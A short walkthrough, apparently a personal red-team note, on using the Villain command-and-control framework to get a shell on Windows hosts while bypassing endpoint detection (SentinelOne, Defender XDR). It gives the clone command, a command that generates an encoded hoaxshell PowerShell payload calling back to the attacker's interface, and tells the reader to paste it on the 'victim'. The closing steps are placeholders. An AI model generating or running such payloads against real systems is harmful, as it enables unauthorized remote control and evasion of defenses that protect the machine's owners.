## Villian Walkthrough

Villian is a very capable (as of 5/16/24) C2 that can be used to bypass EDR on windows. I have actively tested this against S1 and Defender XDR (need to test) and it can successfully bypass both. The best way to use this is to run a powershell encoded payload and run it directly on the target system to force it to run in memory.

#### Download Villian
```
git clone https://github.com/t3l3machus/Villain.git
```

Listeners are already configured as soon as it starts. *If it hangs, just use ctrl + c*

#### Generate Payload

Validate the payload you want to use by moving to ./Villian/Core/payload_templates; I recommend using hoaxshell for windows at least.

```
generate payload=windows/hoaxshell/powershell_iex lhost=eth0 encode
```

#### Copy this into a powershell prompt on victim

#### ????

#### Success!
